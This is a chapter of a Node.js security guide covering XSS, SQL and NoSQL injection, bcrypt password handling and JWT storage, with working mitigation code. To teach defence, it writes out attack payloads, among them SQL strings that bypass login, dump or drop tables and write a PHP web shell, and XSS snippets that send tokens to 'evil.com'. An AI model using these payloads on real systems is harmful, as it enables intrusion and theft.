# Chapter 9. Security in Node.js

## 1. Understanding the Attack Surface

**What attackers control**: Everything the user sends. Every input field, every header, every cookie, every parameter in the URL. If it comes from the client, it cannot be trusted.

```
User's Browser                        Your Server
┌─────────────────┐                  ┌──────────────────────────────────┐
│                 │                  │                                  │
│ Malicious user  │                  │ Your code thinks this is safe    │
│ can modify:     │    HTTP Request  │ because it came from your form,  │
│                 │  ─────────────►  │ but attackers don't use forms.   │
│ • URL           │                  │ They use curl, Postman, or       │
│ • Headers       │                  │ custom scripts.                  │
│ • Body data     │                  │                                  │
│ • Cookies       │                  │        ↓                         │
│ • Query strings │                  │   WRONG!                         │
└─────────────────┘                  └──────────────────────────────────┘
```

**The attacker's mindset**:
1. "What happens if I send `' OR '1'='1` in the email field?"
2. "What happens if I send `{ "$ne": null }` instead of a string?"
3. "What happens if I upload a PHP file instead of a JPEG?"
4. "What happens if I send 10,000 requests per second?"

**Every unanswered question is a potential vulnerability.**

---

## 2. XSS (Cross-Site Scripting)

**What it does**: Attacker injects JavaScript that runs in other users' browsers. This is the most common web vulnerability, and it's devastating because it bypasses all server-side security.

**What an attacker can do with XSS**:
- Steal session cookies and impersonate users
- Capture keystrokes (passwords, credit cards)
- Deface the website
- Redirect users to phishing pages
- Perform actions as the victim (change password, transfer money)
- Install keyloggers and cryptocurrency miners

### 2.2. How XSS Works: The Full Flow

```
┌─────────────┐     ┌─────────────┐     ┌────────────┐     ┌─────────────┐
│  Attacker   │────▶│  Database   │────▶│   Victim  │────▶│   Attacker  │
│             │     │             │     │            │     │             │
│ POST /api/  │     │ Stores the  │     │ Requests   │     │ Receives    │
│ comments    │     │ script in   │     │ comments   │     │ victim's    │
│ with:       │     │ the database│     │ page loads │     │ cookies     │
│ <script>    │     │             │     │ script     │     │             │
│ steal()     │     │             │     │ executes   │     │             │
│ </script>   │     │             │     │            │     │             │
└─────────────┘     └─────────────┘     └──────┬─────┘     └─────────────┘
                                               │
                                         ┌──────▼──────┐
                                         │   Victim's  │
                                         │   Browser   │
                                         │             │
                                         │ 1. Parses   │
                                         │    HTML     │
                                         │ 2. Sees     │
                                         │    <script> │
                                         │ 3. Executes │
                                         │    JavaScript│
                                         │ 4. Sends    │
                                         │    cookies  │
                                         │    to evil. │
                                         │    com      │
                                         └─────────────┘
```

### 2.3. Types of XSS Attacks

**1. Reflected XSS (Non-persistent)**:
The script comes from the current request, usually in a URL parameter.

```
Example: https://example.com/search?q=<script>alert('XSS')</script>

The server takes the 'q' parameter and puts it directly in the HTML response.
The victim clicks a malicious link, and the script executes immediately.
```

**2. Stored XSS (Persistent)**:
The script is saved to the database and served to every user who visits the page.

```
Example: A comment system, forum post, or profile bio.
Once the attacker posts the script, EVERY visitor executes it.
```

**3. DOM-based XSS**:
The vulnerability is entirely in the client-side JavaScript. The server never sees the attack.

```
Example: const name = new URL(location.href).searchParams.get('name');
         document.getElementById('greeting').innerHTML = name;
         
If name contains <script>, it executes in the DOM without ever hitting the server.
```

### 2.4. Vulnerable Code Patterns

**❌ Pattern 1: Direct interpolation in templates**:
```js
// Express + template engine
res.send(`<div>${userInput}</div>`);
```

**❌ Pattern 2: innerHTML**:
```js
// Browser-side JavaScript
element.innerHTML = userInput;  // Executes scripts
```

**❌ Pattern 3: document.write**:
```js
document.write(userInput);  // Can inject any HTML/JS
```

**❌ Pattern 4: eval()**:
```js
eval(userInput);  // Executes arbitrary code
```

**❌ Pattern 5: JSON endpoints returning raw HTML**:
```js
// API endpoint
res.json({ comment: userInput });  // If userInput contains <script>, frontend might inject it
```

### 2.5. Prevention: Escape Everything

**Escape converts dangerous characters to safe HTML entities**:

| Character | HTML Entity | Why |
|-----------|-------------|-----|
| `<` | `&lt;` | Starts HTML tags |
| `>` | `&gt;` | Ends HTML tags |
| `&` | `&amp;` | Starts character entities |
| `"` | `&quot;` | Attribute delimiter |
| `'` | `&#x27;` | Attribute delimiter |
| `/` | `&#x2F;` | Closes tags |

**Implementation with express-validator**:
```js
const { body } = require("express-validator");

// This runs BEFORE the data hits your controller
app.post("/api/comments",
  body("comment")
    .trim()
    .escape(),  // ← Converts < > & " ' /
  
  (req, res) => {
    // req.body.comment is already escaped
    const comment = await Comment.create(req.body);
    res.json(comment);
  }
);
```

**What the database sees**:
```js
// Input: 
{ "comment": "<script>alert('xss')</script>" }

// After escape():
{ "comment": "&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;" }

// Stored safely in database as text, not executable code
```

**What the browser receives**:
```html
&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;
```

**What the user sees**:
```
<script>alert('xss')</script>  (as plain text, no execution)
```

### 2.6. Prevention: Sanitize with XSS Filter

**When you WANT to allow some HTML but not dangerous JavaScript**:

```js
const xss = require("xss");

const sanitized = xss(userInput, {
  whiteList: {          // Allowed tags and attributes
    a: ['href', 'title'],
    b: [],
    i: [],
    strong: [],
    p: [],
    br: [],
    img: ['src', 'alt']
  },
  stripIgnoreTag: true,  // Remove unknown tags
  stripIgnoreTagBody: ['script', 'style'] // Remove tag contents
});
```

**Examples**:

| Input | After sanitize |
|-------|----------------|
| `Hello <b>world</b>` | `Hello <b>world</b>` |
| `Click <a href="javascript:alert(1)">here</a>` | `Click <a>here</a>` |
| `<script>alert('xss')</script>` | `` (empty) |
| `<img src="x" onerror="alert(1)">` | `<img src="x">` |
| `<div onclick="alert(1)">Click</div>` | `Click` |

### 2.7. Prevention: Content Security Policy (CSP)

**CSP tells the browser what sources are allowed to execute scripts**:

```js
const helmet = require("helmet");

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],        // Only same origin by default
    scriptSrc: ["'self'"],         // Scripts only from your domain
    styleSrc: ["'self'"],          // Styles only from your domain
    imgSrc: ["'self'", "data:"],   // Images from your domain or data URIs
    connectSrc: ["'self'"],        // fetch, XHR only to your domain
    fontSrc: ["'self'"],           // Fonts from your domain
    objectSrc: ["'none'"],         // No Flash, Java
    mediaSrc: ["'self'"],          // Video/audio from your domain
    frameSrc: ["'none'"],          // No iframes
    upgradeInsecureRequests: [],   // Auto-upgrade HTTP to HTTPS
  }
}));
```

**What CSP does**:
```
Without CSP:
<script src="https://evil.com/hack.js"></script>  ← Executes

With CSP (scriptSrc: ["'self'"]):
<script src="https://evil.com/hack.js"></script>  ← Blocked, network error
```

---

## 3. SQL Injection

**What it does**: Attacker manipulates your SQL queries by inserting SQL commands through input fields. This is the most dangerous vulnerability because it can give attackers complete control of your database.

**What an attacker can do with SQL injection**:
- Bypass authentication entirely
- Read any data from any table
- Modify or delete data
- Execute administrative operations (shutdown, drop databases)
- Write files to the server (web shells)
- Execute operating system commands (in some configurations)

### 3.1. How SQL Injection Works: The Mechanics

**SQL query structure**:
```
SELECT * FROM users WHERE email = 'alice@example.com'
                              ↑    └─────────┬──────┘
                           string           string
                           delimiter        content
```

**When you build queries with string concatenation**:

```js
// ❌ YOUR VULNERABLE CODE
const email = req.body.email;  // User input
const query = `SELECT * FROM users WHERE email = '${email}'`;
await pool.query(query);
```

**The attacker sends**:
```json
{
  "email": "admin@example.com' OR '1'='1"
}
```

**What actually happens**:
```
Original query structure:
SELECT * FROM users WHERE email = '[email]'
                                 ↑       ↑
                                 quotes denote string boundary

Attacker input: admin@example.com' OR '1'='1
                                 ↑
                                 This quote CLOSES the string

Query becomes:
SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1'
                                 ↑                    ↑
                        String closed          New condition

Result: Returns ALL users because '1'='1' is ALWAYS true
```

---

### 3.2. Real SQL Injection Attacks

**Attack 1: Authentication Bypass**
```sql
Email: admin@example.com' OR '1'='1
Password: anything

Generated query:
SELECT * FROM users 
WHERE email = 'admin@example.com' OR '1'='1' 
AND password = 'anything'

-- The WHERE clause becomes:
-- (email = 'admin@example.com' OR '1'='1') AND password = 'anything'
--                 TRUE or TRUE = TRUE          AND ...password?
-- Actually, '1'='1' is TRUE, so first part is TRUE regardless of email
-- Returns first user, probably admin
```

**Attack 2: Data Extraction with UNION**
```sql
Email: ' UNION SELECT username, password FROM admins; --

Generated query:
SELECT * FROM users WHERE email = '' 
UNION SELECT username, password FROM admins; -- '

Result: Returns all admin usernames and passwords
```

**Attack 3: Data Destruction**
```sql
Email: '; DROP TABLE users; --

Generated query:
SELECT * FROM users WHERE email = ''; DROP TABLE users; -- '

Result: Users table is deleted
```

**Attack 4: Write Web Shell** (MySQL)
```sql
Email: ' UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/html/shell.php"; --

Result: Writes a PHP shell to the web root
```

**Attack 5: Time-based Blind Injection**
```sql
Email: admin@example.com' OR IF(1=1, SLEEP(5), 0); --

Query pauses for 5 seconds if condition is true
Attacker can extract data one bit at a time:
IF(ASCII(SUBSTRING(password,1,1)) > 64, SLEEP(5), 0)
```

### 3.3. Parameterized Queries: The Only Defense

**Parameterized queries separate SQL code from data FOREVER**:

```js
// ✅ PostgreSQL / node-postgres
const query = "SELECT * FROM users WHERE email = $1 AND status = $2";
const values = [req.body.email, 'active'];
const result = await pool.query(query, values);

// ✅ MySQL / mysql2
const query = "SELECT * FROM users WHERE email = ? AND status = ?";
const result = await db.execute(query, [req.body.email, 'active']);

// ✅ SQLite
const query = "SELECT * FROM users WHERE email = ?";
const result = await db.get(query, [req.body.email]);

// ✅ Sequelize ORM
const user = await User.findOne({
  where: {
    email: req.body.email,  // Sequelize parameterizes automatically
    status: 'active'
  }
});

// ✅ Knex.js
const user = await knex('users')
  .where('email', req.body.email)  // Knex parameterizes automatically
  .first();
```

### 3.4. What Parameterized Queries Actually Do

**Step 1: Parse the query structure**
```sql
SELECT * FROM users WHERE email = $1 AND status = $2
└──────────┬──────────┘         ↑            ↑
         CODE               placeholder  placeholder
```

**Step 2: Database prepares the execution plan**
```
The database decides:
- Which indexes to use
- How to join tables
- What order to execute operations

This happens WITHOUT knowing the actual values
```

**Step 3: Bind the parameters**
```js
$1 = "admin@example.com' OR '1'='1"  ← Attacker input
$2 = "active"
```

**Step 4: Execute with parameters as DATA, not CODE**
```
The database:
1. Knows $1 is a string parameter, not SQL
2. Escapes all special characters automatically
3. Treats the ENTIRE value as a single literal string

So: "admin@example.com' OR '1'='1"
Becomes: 'admin@example.com'' OR ''1''=''1'
         └─────────────────┬─────────────────┘
                      literal string, no SQL execution
```

**Visual representation**:
```
Without parameters (❌):
"SELECT * FROM users WHERE email = '" + userInput + "'"
                    DATA STARTS HERE ↑     ↑ DATA ENDS HERE
                    Attacker can add more SQL after the closing quote

With parameters (✅):
"SELECT * FROM users WHERE email = $1"
                                   ↑
                    DATA BOUNDARY IS FIXED
                    Cannot be escaped, cannot add SQL
```

### 3.5. SQL Injection Prevention Checklist

- Never use string concatenation or interpolation in SQL queries
- Always use parameterized queries or prepared statements
- Use an ORM that parameterizes by default (Sequelize, TypeORM, Prisma)
- Validate input types (email should be email, ID should be integer)
- Use database users with minimum required privileges
- Don't expose database errors to clients
- Use stored procedures for complex operations (with caution)

---

## 4. NoSQL Injection (MongoDB)

**What it does**: MongoDB uses JSON-like queries. Attackers inject MongoDB operators (`$ne`, `$gt`, `$regex`, `$where`) to manipulate query logic.

**Why NoSQL injection is different**:
- SQL injection manipulates the query STRING
- NoSQL injection manipulates the query OBJECT
- You're not breaking out of quotes; you're injecting keys and operators

### 4.1. How NoSQL Injection Works

**Vulnerable code**:
```js
// ❌ NEVER DO THIS
const user = await User.findOne({ 
  email: req.body.email,      // What if this is an object?
  password: req.body.password // What if this has $ne?
});
```

**Normal request**:
```json
{
  "email": "alice@example.com",
  "password": "mypassword123"
}
```

**Query becomes**:
```js
User.findOne({
  email: "alice@example.com",
  password: "mypassword123"
})
```

**Attack 1: Authentication Bypass**:
```json
{
  "email": { "$ne": null },
  "password": { "$ne": null }
}
```

**Query becomes**:
```js
User.findOne({
  email: { "$ne": null },  // Find ANY user where email is not null
  password: { "$ne": null } // AND password is not null
})

// Returns the FIRST user in the database
```

**Attack 2: Data Extraction with $regex**:
```json
{
  "email": { "$regex": "^a.*" }  // Find users with email starting with 'a'
}
```

**Attack 3: Blind Injection with $where**:
```json
{
  "$where": "this.password.length < 10"  // Find users with short passwords
}
```

**Attack 4: Operator Injection in Updates**:
```json
{
  "$set": { "role": "admin" },  // Update operator injected
  "email": "user@example.com"
}
```

**Query becomes**:
```js
User.updateOne(
  { email: "user@example.com" },
  { "$set": { "role": "admin" } }  // Attacker promotes themselves
)
```

### 4.2.MongoDB Operators Attackers Use

| Operator | Purpose | Attack |
|----------|---------|--------|
| `$ne` | Not equal | Bypass authentication: `{ "email": { "$ne": null } }` |
| `$gt` | Greater than | Extract data: `{ "age": { "$gt": 50 } }` |
| `$lt` | Less than | Extract data: `{ "age": { "$lt": 18 } }` |
| `$regex` | Pattern matching | Search: `{ "email": { "$regex": "^admin" } }` |
| `$in` | In array | Multiple values: `{ "role": { "$in": ["admin", "superadmin"] } }` |
| `$nin` | Not in array | Exclude values |
| `$exists` | Field exists | Find users with specific fields |
| `$type` | Check BSON type | `{ "password": { "$type": 2 } }` (string) |
| `$mod` | Modulo | `{ "age": { "$mod": [2, 0] } }` (even ages) |
| `$where` | JavaScript execution | Full JS control |
| `$set` | Update field | Privilege escalation |
| `$push` | Add to array | Inject malicious data |
| `$addToSet` | Add to array if not exists | Same as `$push` |

### 4.3. Prevention Strategy 1: Type Validation

**Force input to be primitive values, never objects**:

```js
const { body } = require("express-validator");

app.post("/api/login",
  body("email")
    .isEmail()                    // Must be string, email format
    .trim()
    .normalizeEmail(),
  
  body("password")
    .isString()                  // Must be string, not object
    .isLength({ min: 8 }),
  
  (req, res) => {
    // req.body.email and req.body.password are guaranteed
    // to be strings, not objects with operators
    const user = await User.findOne({
      email: req.body.email,
      passwordHash: req.body.password // Still need bcrypt.compare!
    });
  }
);
```

**What happens with type validation**:

```
Attacker sends: { "email": { "$ne": null }, "password": { "$ne": null } }
                           ↓
Validator: Is { "$ne": null } a valid email?
                           ↓
                         NO
                           ↓
              Response: 400 Bad Request
              "email must be a valid email address"
```

### 4.4. Prevention Strategy 2: Strip Operators

**Remove all `$` and `.` characters from input**:

```js
const mongoSanitize = require("express-mongo-sanitize");

// Remove all operator characters from ALL input
app.use(mongoSanitize({
  replaceWith: '_',  // Replace dots with underscores (default)
  onSanitize: ({ req, key }) => {
    console.warn(`Attempted injection on ${key}`); // Log attacks
  }
}));
```

**What happens to each attack**:

| Attack payload | After sanitize | Result |
|----------------|----------------|--------|
| `{ "$ne": null }` | `{ "ne": null }` | Not an operator |
| `{ "$regex": "^a" }` | `{ "regex": "^a" }` | Literal regex string |
| `{ "$where": "..." }` | `{ "where": "..." }` | Not executed |
| `{ "email.$[0]" }` | `{ "email_[0]" }` | Invalid path |
| `{ "$set": { "role": "admin" } }` | `{ "set": { "role": "admin" } }` | Not an update |

### 4.5. Prevention Strategy 3: Schema Validation

**Define exactly what your data should look like**:

```js
const userSchema = new mongoose.Schema({
  email: {
    type: String,
    required: true,
    lowercase: true,
    trim: true,
    validate: {
      validator: function(v) {
        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);
      },
      message: "Invalid email format"
    }
  },
  age: {
    type: Number,
    min: 13,
    max: 120,
    validate: {
      validator: Number.isInteger,
      message: "Age must be an integer"
    }
  },
  role: {
    type: String,
    enum: ["user", "moderator", "admin"],
    default: "user"
  },
  passwordHash: {
    type: String,
    required: true
  },
  createdAt: {
    type: Date,
    default: Date.now,
    immutable: true  // Cannot be modified after creation
  }
});

// Mongoose will:
// 1. Cast values to specified types
// 2. Run validators before save
// 3. Reject objects with extra fields
// 4. Reject operators in values
```

### 4.6. Prevention Strategy 4: Allowlist Pattern

**Explicitly define what fields can be used in queries**:

```js
const allowedQueryFields = ["email", "username", "status"];

function sanitizeQuery(query) {
  const sanitized = {};
  
  Object.keys(query).forEach(key => {
    // Only allow specific fields
    if (allowedQueryFields.includes(key)) {
      // Only allow string or number values, not objects
      if (typeof query[key] === "string" || typeof query[key] === "number") {
        sanitized[key] = query[key];
      }
    }
  });
  
  return sanitized;
}

app.get("/api/users", (req, res) => {
  const query = sanitizeQuery(req.query);
  const users = await User.find(query);
  res.json(users);
});
```

---

## 5. Password Security

### 5.1. Why Plain Text Passwords Are Catastrophic

**When your database is leaked (not IF, but WHEN)**:

**Scenario 1: Plain text storage (❌)**:
```
Database dump - 1 million users

┌─────────────────┬──────────────────┬─────────────────┐
│ email           │ password         │ other_data      │
├─────────────────┼──────────────────┼─────────────────┤
│ alice@gmail.com │ mypassword123    │ credit_card: x  │
│ bob@yahoo.com   │ securepass456    │ ssn: 123-45-... │
│ carol@company   │ password123      │ bank_acct: ...  │
│ dave@hotmail    │ qwerty2024       │ address: ...    │
└─────────────────┴──────────────────┴─────────────────┘

Attacker now:
✓ Can log into YOUR app as any user
✓ Will try same email/password on Gmail, banking, PayPal
✓ Sells credentials on dark web ($5-10 per account)
✓ Uses accounts for spam, fraud, identity theft

Your liability: Potentially millions in damages
```

**Scenario 2: Hashed storage (✅)**:
```
Database dump - 1 million users

┌─────────────────┬────────────────────────────────────────┐
│ email           │ passwordHash                           │
├─────────────────┼────────────────────────────────────────┤
│ alice@gmail.com │ $2b$10$N9qo8uLOickgx2ZMRZoMy.e1J8b4... │
│ bob@yahoo.com   │ $2b$10$vI8aWBnW3fID.ZQ4/zo1G.q1lRps... │
│ carol@company   │ $2b$10$92IXUNpkjO0rOQ5byMi.Ye4oKoEa... │
└─────────────────┴────────────────────────────────────────┘

Attacker now:
✗ Cannot reverse hash to get original password
✗ Cannot log into your app
✗ Cannot try credentials on other sites
✗ Cannot sell working credentials

Attacker's options:
- Try to crack hashes (expensive: ~$100k to crack 1000 hashes)
- Give up and move to easier target

Your liability: None (passwords still safe)
```

### 5.2. How bcrypt Works: The Deep Dive

**bcrypt is specifically designed for passwords**:
- Slow by design (makes cracking expensive)
- Includes salt automatically (prevents rainbow tables)
- Adaptive (increase cost as hardware improves)
- Constant-time comparison (prevents timing attacks)

**The bcrypt hash format**:
```
$2b$10$N9qo8uLOickgx2ZMRZoMy.e1J8b4e1J8b4e1J8b4e1J8b4
└┬─┘└┬┘└──────────┬──────────┘└──────────┬──────────┘
version cost      salt                   hash
```

**Breakdown**:
- `$2b$`: bcrypt version (2a, 2b, 2y - use 2b)
- `10`: Cost factor (2^10 = 1024 rounds of key expansion)
- `N9qo8uLOickgx2ZMRZoMy.`: 22 character salt (128 bits)
- `e1J8b4...`: 31 character hash (184 bits)

**Why cost matters**:

| Cost | Rounds | Time (approx) | Security |
|------|--------|---------------|----------|
| 8 | 256 | 0.05s | Too fast, crackable |
| 10 | 1024 | 0.2s | Good for most apps |
| 12 | 4096 | 0.8s | Better for high security |
| 14 | 16384 | 3.2s | Probably overkill |

**Choose cost based on your server hardware**:
- Target ~250ms per hash
- Adjust up as hardware improves
- Test with `bcrypt.hash()` benchmark

### 5.3. The Registration Flow

```js
const bcrypt = require("bcrypt");
const SALT_ROUNDS = 12;  // 2^12 = 4096 rounds

async function signup(req, res) {
  try {
    // 1. Validate input (already done by middleware)
    const { email, password, username } = req.body;
    
    // 2. Check if user exists
    const existingUser = await User.findOne({ email });
    if (existingUser) {
      return res.status(409).json({ 
        error: "Email already registered" 
      });
    }
    
    // 3. Generate salt (random data unique to this user)
    const salt = await bcrypt.genSalt(SALT_ROUNDS);
    console.log(salt); // $2b$12$N9qo8uLOickgx2ZMRZoMy.
    
    // 4. Hash password with salt
    const hash = await bcrypt.hash(password, salt);
    console.log(hash); // $2b$12$N9qo8uLOickgx2ZMRZoMy.e1J8b4...
    
    // 5. Store ONLY the hash
    const user = await User.create({
      email,
      username,
      passwordHash: hash,  // ← NEVER store plain password
      createdAt: new Date()
    });
    
    // 6. Don't send hash back to client
    res.status(201).json({
      id: user._id,
      email: user.email,
      username: user.username
    });
    
  } catch (error) {
    console.error("Signup error:", error);
    res.status(500).json({ error: "Failed to create account" });
  }
}
```

### 5.4. The Login Flow

```js
async function login(req, res) {
  try {
    const { email, password } = req.body;
    
    // 1. Find user by email
    const user = await User.findOne({ email })
      .select("+passwordHash"); // Include password hash if excluded by default
    
    // 2. Generic error message (don't reveal if user exists)
    if (!user) {
      await bcrypt.compare(password, "$2b$12$xxxxxxxxxxxx"); // Dummy compare
      return res.status(401).json({ 
        error: "Invalid email or password" 
      });
    }
    
    // 3. Compare provided password with stored hash
    const isValid = await bcrypt.compare(password, user.passwordHash);
    
    if (!isValid) {
      return res.status(401).json({ 
        error: "Invalid email or password" 
      });
    }
    
    // 4. Check if account is locked/verified
    if (user.lockedUntil && user.lockedUntil > Date.now()) {
      return res.status(403).json({ 
        error: "Account locked. Try again later." 
      });
    }
    
    // 5. Update last login
    user.lastLoginAt = new Date();
    user.loginAttempts = 0; // Reset failed attempts
    await user.save();
    
    // 6. Generate session/token
    const token = generateJWT(user);
    setTokenCookie(res, token);
    
    // 7. Return user data (never the hash!)
    res.json({
      id: user._id,
      email: user.email,
      username: user.username,
      role: user.role
    });
    
  } catch (error) {
    console.error("Login error:", error);
    res.status(500).json({ error: "Login failed" });
  }
}
```

### 5.5. Why bcrypt.compare() Is Essential

**❌ DON'T do this**:
```js
const hash = await bcrypt.hash(password, 10);
if (hash === user.passwordHash) {  // Wrong!
  // Login success
}
```

**Why this fails**:
```js
// bcrypt.hash() generates a NEW salt each time
const hash1 = await bcrypt.hash("mypassword", 10);
const hash2 = await bcrypt.hash("mypassword", 10);

console.log(hash1 === hash2); // false! Different salt = different hash
```

**✅ ALWAYS do this**:
```js
const isValid = await bcrypt.compare(password, user.passwordHash);
```

**What bcrypt.compare() does**:

```
┌─────────────────────────────────────────────────────────────┐
│ bcrypt.compare("mypassword123", stored_hash)                │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ 1. Extract salt from stored_hash                            │
│    stored_hash = $2b$12$N9qo8uLOickgx2ZMRZoMy.e1J8b4...     │
│                      └──────────┬──────────┘                │
│                                salt                         │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ 2. Hash input password with EXTRACTED salt                  │
│    bcrypt.hash("mypassword123", extracted_salt)             │
│                              │                              │
│                              ▼                              │
│    new_hash = $2b$12$N9qo8uLOickgx2ZMRZoMy.e1J8b4...        │
└─────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────┐
│ 3. Constant-time compare                                    │
│    new_hash === stored_hash?                                │
│                              │                              │
│           ┌──────────────────┴──────────────────┐           │
│           ▼                                     ▼          │
│       true                                     false        │
│         │                                       │           │
│         ▼                                       ▼          │
│   Password correct                        Password wrong    │
└─────────────────────────────────────────────────────────────┘
```

### 5.6. Password Reset Flow

```js
const crypto = require("crypto");

// ========== GENERATE RESET TOKEN ==========
userSchema.methods.generatePasswordResetToken = function() {
  // 1. Generate random token (32 bytes = 64 hex chars)
  const resetToken = crypto.randomBytes(32).toString("hex");
  // "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6"
  
  // 2. Hash token before storing (never store raw tokens)
  this.passwordResetToken = crypto
    .createHash("sha256")
    .update(resetToken)
    .digest("hex");
  // "6a2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c"
  
  // 3. Set expiration (10 minutes)
  this.passwordResetExpires = Date.now() + 10 * 60 * 1000;
  
  // 4. Return UNHASHED token to send via email
  return resetToken;
};

// ========== REQUEST RESET ==========
async function forgotPassword(req, res) {
  const { email } = req.body;
  
  const user = await User.findOne({ email });
  
  // Always return same message (don't reveal if email exists)
  if (!user) {
    return res.json({
      message: "If that email exists, a reset link has been sent."
    });
  }
  
  // Generate token
  const resetToken = user.generatePasswordResetToken();
  await user.save();
  
  // Send email
  const resetUrl = `${process.env.FRONTEND_URL}/reset-password/${resetToken}`;
  
  await sendEmail({
    to: user.email,
    subject: "Password Reset Request",
    html: `
      <p>You requested a password reset.</p>
      <p>Click <a href="${resetUrl}">here</a> to reset your password.</p>
      <p>This link expires in 10 minutes.</p>
      <p>If you didn't request this, ignore this email.</p>
    `
  });
  
  res.json({
    message: "If that email exists, a reset link has been sent."
  });
}

// ========== RESET PASSWORD ==========
async function resetPassword(req, res) {
  const { token } = req.params;
  const { password } = req.body;
  
  // Hash the token from URL (matches stored hash)
  const hashedToken = crypto
    .createHash("sha256")
    .update(token)
    .digest("hex");
  
  // Find user with valid token
  const user = await User.findOne({
    passwordResetToken: hashedToken,
    passwordResetExpires: { $gt: Date.now() }
  });
  
  if (!user) {
    return res.status(400).json({
      error: "Invalid or expired reset token"
    });
  }
  
  // Set new password
  user.passwordHash = password; // Will be hashed by pre-save hook
  user.passwordResetToken = undefined;
  user.passwordResetExpires = undefined;
  user.passwordChangedAt = Date.now(); // Invalidate existing sessions
  
  await user.save();
  
  // Invalidate all existing sessions
  await Session.deleteMany({ userId: user._id });
  
  res.json({
    message: "Password reset successful. Please login with your new password."
  });
}
```

### 5.7. Password Security Checklist

- Never store passwords in plain text
- Use bcrypt with cost factor ≥ 12
- Always use `bcrypt.compare()`, never compare hashes yourself
- Use generic error messages ("Invalid email or password")
- Implement account lockout after failed attempts
- Require strong passwords (8+ chars, mixed case, numbers, symbols)
- Don't truncate passwords (bcrypt handles up to 72 bytes)
- Hash passwords on the server, never in the client
- Use HTTPS for all authentication endpoints
- Implement rate limiting on login/registration
- Provide "forgot password" functionality with expiring tokens
- Log all authentication attempts (success/failure)
- Alert users of new logins via email
- Force password change on first login (for admin-created accounts)
- Don't send passwords via email (even reset links, not passwords)

---

## 6. JWT Security

### 6.1. Understanding JWT: What It Is and Isn't

**JWT is NOT encryption**:
- Anyone can read the payload (it's just base64)
- JWT is for VERIFICATION, not SECRECY
- Think of it as a tamper-evident container, not a locked box

**JWT is a signature, not a lock**:
```
┌─────────────────────────────────────────────────────────┐
│  JWT = Signed statement: "User ID 123 is authenticated │
│         and has role 'user'. I, the server, certify    │
│         this."                                         │
└─────────────────────────────────────────────────────────┘
```

**When to use JWT**:
- Stateless authentication
- Single sign-on (SSO)
- API authentication
- Short-lived access tokens

**When NOT to use JWT**:
- Sensitive data transmission (use encryption)
- Long-lived sessions (use database sessions + refresh tokens)
- High-security applications (use opaque tokens + database)

### 6.2. JWT Structure: Deep Dive

```
[Header].[Payload].[Signature]
    ↓        ↓          ↓
  base64    base64     base64
```

**Header (algorithm and type)**:
```js
// Raw
{
  "alg": "HS256",     // HMAC-SHA256
  "typ": "JWT"        // JWT type
}

// Base64URL encoded
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9
```

**Payload (claims - DO NOT PUT SECRETS HERE)**:
```js
// Registered claims (standard)
{
  "iss": "https://myapp.com",     // Issuer
  "sub": "user123",              // Subject
  "aud": "https://api.myapp.com", // Audience
  "exp": 1516242622,            // Expiration
  "nbf": 1516239022,            // Not before
  "iat": 1516239022,           // Issued at
  "jti": "unique-id-123"       // JWT ID
}

// Private claims (your data)
{
  "userId": "507f1f77bcf86cd799439011",
  "role": "user",
  "permissions": ["read:posts", "write:posts"]
}

// Combined + Base64URL encoded
eyJ1c2VySWQiOiI1MDdmMWY3N2JjZjg2Y2Q3OTk0MzkwMTEiLCJyb2xlIjoidXNlciJ9
```

**⚠️ CRITICAL WARNING**:
```js
// Anyone can decode your JWT payload:
const payload = jwt.decode(token); // NO SECRET REQUIRED!
console.log(payload); // Shows all your data

// NEVER put in JWT:
❌ password: "mypassword123"
❌ ssn: "123-45-6789"
❌ creditCard: "4111-1111-1111-1111"
❌ apiKey: "YOUR_API_KEY"
❌ email: "user@example.com" (if possible, use userId)
```

**Signature (verification)**:
```js
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

### 6.3. How JWT Signature Works

**Step 1: Server creates token**:
```js
// Header + Payload
const unsignedToken = base64UrlEncode(header) + "." + base64UrlEncode(payload);
// "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMifQ"

// Sign with secret
const signature = HMAC_SHA256(unsignedToken, "my-super-secret-key-32chars+");
// "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

// Complete token
const token = unsignedToken + "." + signature;
```

**Step 2: Attacker modifies payload**:
```js
// Original payload
{ "userId": "123", "role": "user" }

// Attacker changes to
{ "userId": "123", "role": "admin" }

// New payload = new signature
const newPayload = base64UrlEncode(modifiedPayload);
const newSignature = HMAC_SHA256(header + "." + newPayload, secret);
// Attacker doesn't know secret → cannot compute valid signature

// Token sent to server:
header.modified_payload.old_signature
```

**Step 3: Server verifies**:
```js
const tokenParts = token.split(".");
const header = tokenParts[0];
const payload = tokenParts[1];
const signature = tokenParts[2];

const unsignedToken = header + "." + payload;
const expectedSignature = HMAC_SHA256(unsignedToken, SECRET);

if (signature !== expectedSignature) {
  // Token has been tampered with
  throw new Error("Invalid signature");
}
```

### 6.4. JWT Storage: The Critical Decision

**Option 1: localStorage (❌ NEVER)**:

```js
// After login
localStorage.setItem("token", jwt);

// ANY JavaScript on your page can do this:
<script>
  const token = localStorage.getItem("token");
  fetch("https://evil.com/steal?token=" + token);
</script>

// Even third-party scripts, ads, analytics can access it
// One XSS vulnerability = all tokens stolen
```

**Why localStorage is dangerous**:
- No built-in protection
- Accessible to any JavaScript running on your domain
- Survives browser restarts (long-lived exposure)
- Can't be invalidated server-side without tracking

**Option 2: Regular cookie (❌ DANGEROUS)**:

```js
document.cookie = "token=" + jwt;

// Same XSS vulnerability:
<script>
  const token = document.cookie.split("token=")[1];
  fetch("https://evil.com/steal?token=" + token);
</script>
```

